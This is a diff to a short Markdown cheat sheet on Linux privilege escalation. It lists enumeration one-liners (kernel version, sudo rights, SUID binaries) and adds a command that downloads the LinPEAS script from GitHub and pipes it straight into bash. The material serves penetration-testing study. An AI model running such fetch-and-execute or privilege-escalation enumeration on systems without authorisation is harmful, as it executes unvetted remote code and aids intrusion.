@@ -4,10 +4,14 @@ For Linux privesc I usually like enumerating all directories and unusual files I
 
 ## Identifying Privesc
 
+### One-Liners
+
 Run the following one liners to enumerate your privs on the box:
 
 - `uname -a` == Gives you linux kernel ver.
 - `sudo -l` == Shows you where you have SUDO privs.
 - `find / -perm -u=s -type f 2>/dev/null` == Locate SUID Binaries.
 
+### Linpeas
 
+`curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh | bash`
